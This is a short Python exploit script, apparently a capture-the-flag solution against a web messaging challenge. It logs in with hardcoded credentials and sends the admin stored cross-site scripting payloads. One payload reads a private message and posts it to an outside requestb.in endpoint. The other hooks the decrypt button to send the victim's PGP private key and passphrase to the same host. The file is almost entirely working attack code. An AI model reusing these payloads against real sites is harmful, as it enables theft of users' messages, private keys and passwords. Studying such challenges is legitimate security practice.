import requests

LOGIN_URL = "https://hard.web.uw2017.p4.team/login"

sess = requests.session()

sess.post(LOGIN_URL, data={"username": "tomek", "password": "furmanka"})

def send_message(msg):
    data = {
        "subject": "test",
        "encmessage": msg,
        "recipient": "1"
    }

    response = sess.post("https://hard.web.uw2017.p4.team/send_message/admin", data=data)

    print(response.text)


def get_message(msg_id):
    url = "https://hard.web.uw2017.p4.team/read_message/{}".format(msg_id)
    print(url)
    response = sess.get(url,
        headers={'referer': "https://hard.web.uw2017.p4.team/list_messages"})

    print(response.text)


script = """
<script>
window.history.replaceState({}, "Hello", '/list_messages')

$.ajax({
    url: "/read_message/1",
}).then(function(data) {
    $.post({
        url: "https://requestb.in/158azuq1",
        data: {
            doc: data
        }
    })
});
</script>
"""

script = """
<script>
$(function() {
    var privkey = document.getElementById("privkey");
    var user_pass = document.getElementById("pgp-pass");

    document.getElementById('decrypt-button').onclick = function() {
        $.post({
            url: "https://requestb.in/158azuq1",
            data: {
                privKey: privkey.value.trim(),
                userPass: user_pass.value
            }
        })
    };
});
</script>
"""

send_message(script)
